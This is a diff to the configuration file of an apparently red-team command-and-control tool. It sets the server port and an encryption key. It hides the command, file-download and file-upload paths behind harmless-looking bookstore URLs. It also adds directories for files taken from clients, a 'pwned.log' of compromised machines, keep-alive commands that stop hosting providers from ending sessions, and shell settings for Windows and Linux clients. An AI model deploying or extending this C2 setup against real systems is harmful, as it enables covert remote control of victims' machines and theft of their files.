@@ -1,10 +1,19 @@
-# ------------  Begin variables used in both client and c2 server code  ------------ #
+# ------------  Begin variables used in both client and c2 server code  ------------
 
 # Port c2 server listens on
-PORT = 1337
+PORT = 80
+
+# This key must be 32 characters or fewer
+KEY = "U can't touch this!"
 
 # Path to use for signifying a command request from a client using HTTP GET
 CMD_REQUEST = "/book?isbn="
+
+# Path to use for signifying a file download request from a client using HTTP GET
+FILE_REQUEST = "/author?name="
+
+# Path to use for signifying a file upload from a client using HTTP PUT
+FILE_SEND = "/reviews"
 
 # Path to use for signifying command output or errors from a client using HTTP POST
 RESPONSE = "/inventory"
@@ -15,12 +24,38 @@ CWD_RESPONSE = "/title"
 # POST variable name to use for assigning to command output from a client
 RESPONSE_KEY = "index"
 
-# ----------------------  Begin c2 server code only variables  ---------------------- #
+# Password used for encrypting and decrypting zip files; must be bytes data type
+ZIP_PASSWORD = b"*--->Red_Team_Op_1337<---*"
+
+# ----------------------  Begin c2 server code only variables  ----------------------
 
 # Leave blank for binding to all interfaces, otherwise specify c2 server's IP address
 BIND_ADDR = ""
 
-# -----------------------  Begin client code only variables  ------------------------ #
+# Directory to hold uploaded client files
+INCOMING = "incoming"
+
+# Directory to stage files for possible download to clients
+OUTGOING = "outgoing"
+
+# Log file for recording compromised clients
+LOG = "pwned.log"
+
+# Command input timeout setting in seconds; 225 is about right for Azure; set to NONE if not needed
+# INPUT_TIMEOUT = 3
+INPUT_TIMEOUT = None
+
+# Run this command automatically to prevent Azure and other hosting environments from killing our active session
+KEEP_ALIVE_CMD = "time /T"  # Windows client only
+# KEEP_ALIVE_CMD = "date +%R"  # Linux client only
+
+# Set shell for Linux
+SHELL = "/bin/bash"
+
+# Set shell for Windows
+# SHELL = "cmd.exe"
+
+# -----------------------  Begin client code only variables  ------------------------
 
 # Set the c2 server's IP address or hostname
 C2_SERVER = "localhost"
